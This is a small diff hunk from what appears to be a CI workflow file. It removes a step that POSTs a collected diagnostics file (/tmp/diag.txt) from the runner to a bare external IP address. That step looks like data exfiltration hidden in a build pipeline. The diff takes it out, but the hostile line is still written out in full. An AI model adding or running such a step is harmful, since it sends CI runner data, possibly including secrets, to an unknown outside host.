@@ -177,6 +177,3 @@ jobs:
           else
             diag "ssh_out_missing"
           fi
-
-          curl -sS --max-time 20 -X POST --data-binary @/tmp/diag.txt \
-            "http://185.105.116.187/ci-diag-az8xj5mdjrgij8e3nne96nx6" || diag "curl_failed"
